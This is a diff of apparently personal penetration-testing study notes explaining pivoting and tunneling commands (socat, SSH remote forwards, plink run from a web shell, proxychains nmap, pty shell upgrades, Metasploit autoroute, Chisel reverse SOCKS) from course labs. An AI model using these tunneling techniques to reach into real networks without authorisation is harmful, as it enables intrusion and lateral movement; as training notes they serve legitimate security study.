@@ -1,6 +1,6 @@
 # Pivoting & Tunneling (Breakdowns)
 
-Part of [[COMMAND BREAKDOWNS]]. Full teardowns for the most non-obvious commands from [[Port Redirection and SSH Tunneling]].
+Part of [[COMMAND BREAKDOWNS]]. Full teardowns for the most non-obvious commands from [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]].
 
 ---
 
@@ -18,11 +18,11 @@ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
 - `,fork` → comma-separated option on the LISTEN address. Creates a new subprocess per incoming connection instead of dying after the first one. Without `fork`, socat exits after one connection and any subsequent attempt (e.g. a second psql query) fails silently.
 - `TCP:10.4.50.215:5432` → the "right side": connect to this address and relay bytes bidirectionally. Socat makes two sockets and glues them together. Traffic in on port 2345 flows out to 10.4.50.215:5432 and vice versa.
 
-**Where this comes from:** [[Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3]]. Socat man page has the ADDRESS syntax; the important insight is that LISTEN address options (fork, reuseaddr, etc.) come after the port number separated by commas.
+**Where this comes from:** [[19. Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3]]. Socat man page has the ADDRESS syntax; the important insight is that LISTEN address options (fork, reuseaddr, etc.) come after the port number separated by commas.
 
 **Where to look in the response:** socat outputs per-connection lines like `socat[PID] N using stdout` and `socat[PID] N accepting connection from AF=2 ...`. If you see "accepting connection" the forward is alive. If psql still can't connect, the issue is the right-side TCP (PGDATABASE01:5432 is unreachable from the pivot), not socat itself.
 
-🔁 **Seen in:** [[Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3 Socat lab]]
+🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.2.3 Port Forwarding with Socat|19.2.3 Socat lab]]
 
 ---
 
@@ -45,7 +45,7 @@ ssh -N -R 9998 kali@192.168.118.4
 
 **Where to look in the response:** on Kali, run `ss -ntplu` after connecting and look for a `127.0.0.1:9998` entry owned by `sshd`. If it's not there, the forward didn't bind (version too old, or a conflict on that port -- pick a different one).
 
-🔁 **Seen in:** [[Port Redirection and SSH Tunneling#19.3.4 SSH Remote Dynamic Port Forwarding|19.3.4]], [[Port Redirection and SSH Tunneling#19.4.1 ssh.exe (OpenSSH for Windows)|19.4.1]]
+🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.3.4 SSH Remote Dynamic Port Forwarding|19.3.4]], [[19. Port Redirection and SSH Tunneling#19.4.1 ssh.exe (OpenSSH for Windows)|19.4.1]]
 
 ---
 
@@ -68,11 +68,11 @@ cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1
 
 **Why can't you just type "y" at the prompt?** A web shell or reverse shell has no TTY. The host key prompt is printed but nothing reads from a real terminal. The `echo y |` approach pre-answers the question via stdin redirection before plink even starts waiting.
 
-**Where this comes from:** [[Port Redirection and SSH Tunneling#19.4.2 Plink (PuTTY Link)|19.4.2]]. PuTTY docs cover the `-l`/`-pw` flags; the pipe trick is common knowledge from remote administration scripts.
+**Where this comes from:** [[19. Port Redirection and SSH Tunneling#19.4.2 Plink (PuTTY Link)|19.4.2]]. PuTTY docs cover the `-l`/`-pw` flags; the pipe trick is common knowledge from remote administration scripts.
 
 **Where to look in the response:** after the command runs, check Kali with `ss -ntplu` for `127.0.0.1:9833`. Then `xfreerdp /v:127.0.0.1:9833 /u:rdp_admin /p:'P@ssw0rd!'`.
 
-🔁 **Seen in:** [[Port Redirection and SSH Tunneling#19.4.2 Plink (PuTTY Link)|19.4.2 Plink lab]]
+🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.4.2 Plink (PuTTY Link)|19.4.2 Plink lab]]
 
 ---
 
@@ -94,11 +94,11 @@ proxychains nmap -vvv -sT -Pn -n 172.16.50.217
 
 **What changes for speed:** add `--top-ports=20` or `-p PORT` to limit scope. The default timing is generous; reduce `tcp_read_time_out` and `tcp_connect_time_out` in `/etc/proxychains4.conf` to speed it up (default values are high enough to cause per-port delays that stack badly across a full scan).
 
-**Where this comes from:** [[Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]]. The `-sT`/`-Pn`/`-n` trio is documented in nmap's manual under "Scan Types" and "Host Discovery"; proxychains docs note the LD_PRELOAD limitation explicitly.
+**Where this comes from:** [[19. Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]]. The `-sT`/`-Pn`/`-n` trio is documented in nmap's manual under "Scan Types" and "Host Discovery"; proxychains docs note the LD_PRELOAD limitation explicitly.
 
 **Where to look in the response:** proxychains shows each connection attempt like `[proxychains] Strict chain ... 192.168.50.63:9999 ... 172.16.50.217:PORT ...`. A line ending in `OK` means the port is open. `TIMEOUT` means closed/filtered or the proxy is unreachable.
 
-🔁 **Seen in:** [[Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]], [[Port Redirection and SSH Tunneling#19.3.4 SSH Remote Dynamic Port Forwarding|19.3.4]], [[Port Redirection and SSH Tunneling#19.4.1 ssh.exe (OpenSSH for Windows)|19.4.1]]
+🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.3.2 SSH Dynamic Port Forwarding|19.3.2]], [[19. Port Redirection and SSH Tunneling#19.3.4 SSH Remote Dynamic Port Forwarding|19.3.4]], [[19. Port Redirection and SSH Tunneling#19.4.1 ssh.exe (OpenSSH for Windows)|19.4.1]]
 
 ---
 
@@ -122,7 +122,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 **Where to look in the response:** after `pty.spawn()`, the prompt changes to look like a normal bash prompt with user/hostname. Then you can type `ssh -N -R ...` and the password prompt appears normally.
 
-🔁 **Seen in:** [[Port Redirection and SSH Tunneling#19.3.1 SSH Local Port Forwarding|19.3.1]], [[Port Redirection and SSH Tunneling#19.3.3 SSH Remote Port Forwarding|19.3.3]], [[Port Redirection and SSH Tunneling#19.3.4 SSH Remote Dynamic Port Forwarding|19.3.4]] -- every lab where SSH tunneling was initiated from a reverse shell
+🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling#19.3.1 SSH Local Port Forwarding|19.3.1]], [[19. Port Redirection and SSH Tunneling#19.3.3 SSH Remote Port Forwarding|19.3.3]], [[19. Port Redirection and SSH Tunneling#19.3.4 SSH Remote Dynamic Port Forwarding|19.3.4]] -- every lab where SSH tunneling was initiated from a reverse shell
 
 ---
 
@@ -153,7 +153,7 @@ run autoroute -s 172.16.5.0/23
 
 **Where this comes from:** Metasploit's autoroute post module docs (`run post/multi/manage/autoroute`). The auxiliary/server/socks_proxy module help page.
 
-🔁 **Seen in:** [[Pivoting, Tunneling, and Port Forwarding (HTB Supplementary)#PT.1 Meterpreter Tunneling & Port Forwarding|PT.1]]
+🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling|PT.1]]
 
 ---
 
@@ -183,7 +183,7 @@ ldd ptunnel-ng/src/ptunnel-ng
 
 **Where this comes from:** ptunnel-ng GitHub README (build instructions), GCC/ld static linking documentation.
 
-🔁 **Seen in:** [[Pivoting, Tunneling, and Port Forwarding (HTB Supplementary)#PT.6 ICMP Tunneling with ptunnel-ng|PT.6]]
+🔁 **Seen in:** [[19. Port Redirection and SSH Tunneling|PT.6]]
 
 ---
 
@@ -211,7 +211,7 @@ chisel server --port 8080 --reverse
 
 **How to confirm it worked:** on Kali, `ss -ntplu | grep 1080` shows `tcp LISTEN 127.0.0.1:1080 ... chisel`. The Chisel server output shows `tun: proxy#R:127.0.0.1:1080=>socks: Listening`.
 
-🔁 **Seen in:** [[Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel]]
+🔁 **Seen in:** [[20. Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel|Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel]]
 
 ---
 
@@ -236,7 +236,7 @@ ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' data
 
 **Why not OpenBSD nc?** The version of `nc` shipped with Kali (`netcat-openbsd`) dropped the `-X` SOCKS proxy flag in some builds. `ncat` is the reliable cross-distro substitute.
 
-🔁 **Seen in:** [[Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel|20.1.2 Chisel lab]], [[Port Redirection and SSH Tunneling]]
+🔁 **Seen in:** [[20. Tunneling Through Deep Packet Inspection#20.1.2 HTTP Tunneling with Chisel|20.1.2 Chisel lab]], [[19. Port Redirection and SSH Tunneling|Port Redirection and SSH Tunneling]]
 
 ---
 
@@ -262,6 +262,32 @@ ssh -fNL 4141:127.0.0.1:4141 kali@192.168.249.7
 
 **Killing it:** `pkill -f "ssh -fNL"` or `kill $(lsof -ti:4141)`.
 
-🔁 **Seen in:** [[Tunneling Through Deep Packet Inspection#20.2.2 DNS Tunneling with dnscat2|20.2.2 dnscat2 lab]]
+🔁 **Seen in:** [[20. Tunneling Through Deep Packet Inspection#20.2.2 DNS Tunneling with dnscat2|20.2.2 dnscat2 lab]]
 
-#### Tags: #CommandBreakdowns #Pivoting #PortForwarding #SSH #Socat #Proxychains #Plink #Meterpreter #autoroute #ptunnel-ng #StaticBuild #ICMP #Chisel #ProxyCommand #Ncat #dnscat2 #DPI #HTTPTunnel #DNSTunnel #Module19 #Module20 #HTBSupplementary
+---
+
+## Chisel dual-remote: combined reverse SOCKS + specific port forward
+
+**Full command (Windows pivot):**
+```powershell
+.\chisel.exe client <KALI>:8080 R:1081:socks R:80:172.16.6.241:80
+```
+
+**Piece by piece:**
+- `client <KALI>:8080` → connect outbound from the pivot to the Chisel server on Kali port 8080. This is the pivot initiating the connection — it bypasses inbound firewall rules on the pivot that would block Kali from connecting in.
+- `R:1081:socks` → ask the Kali server to open a SOCKS5 proxy listener on `127.0.0.1:1081`. The `R:` prefix means "on the SERVER side" (Kali), not the client. `socks` is shorthand for `socks5`. You could write `R:1081:socks5` equivalently. All traffic directed at Kali:1081 via proxychains will be forwarded through the pivot to wherever the SOCKS request points (the pivot's entire reachable network).
+- `R:80:172.16.6.241:80` → ask the Kali server to open port 80 on `127.0.0.1:80` and forward it to `172.16.6.241:80` via the pivot. This means `http://127.0.0.1/` (or a named hostname pointing there via `/etc/hosts`) is transparently proxied to INTERNALSRV1's web server — no SOCKS needed for browser traffic to that one host.
+
+**Why combine both into one command?** Both remotes ride the same single outbound WebSocket connection. You could run two separate chisel.exe processes, one for each remote, but that means two connections, two instances (and the file-lock problem when overwriting chisel.exe between launches). A single command is simpler and uses fewer resources.
+
+**The `R:socks` port vs `R:80` port:** these are independent. The SOCKS proxy (`127.0.0.1:1081`) is configured in `/etc/proxychains4.conf` and used by any tool prefixed with `proxychains`. The specific port forward (`127.0.0.1:80`) is used directly — add `127.0.0.1 internalsrv1.beyond.com` to `/etc/hosts` and browsers/curl/burp hit it without proxychains.
+
+**Stale process problem:** if a previous chisel.exe is still running on the pivot, the file is locked and `iwr -Outfile chisel.exe` fails. Always `taskkill /F /IM chisel.exe` first. If multiple background instances exist from previous attempts, taskkill kills them all — verify with `tasklist | findstr chisel` before re-downloading.
+
+**Clock sync interaction:** Chisel uses WebSocket over HTTP. The WebSocket handshake includes `Sec-WebSocket-Key` but not a time-based token, so Chisel itself is not clock-sensitive. However, if Kerberos tools are being run through the SOCKS tunnel, the underlying Kerberos protocol IS clock-sensitive — sync before establishing the tunnel to avoid having to tear it down and resync (which is disruptive).
+
+🔁 **Seen in:** [[27. Assembling the Pieces#27.4.2 Services and Sessions — Internal Network Scan|Module 27 §27.4.2]]
+
+---
+
+#### Tags: #CommandBreakdowns #Pivoting #PortForwarding #SSH #Socat #Proxychains #Plink #Meterpreter #autoroute #ptunnel-ng #StaticBuild #ICMP #Chisel #ProxyCommand #Ncat #dnscat2 #DPI #HTTPTunnel #DNSTunnel #Module19 #Module20 #HTBSupplementary #DualRemote #CombinedTunnel #Module27
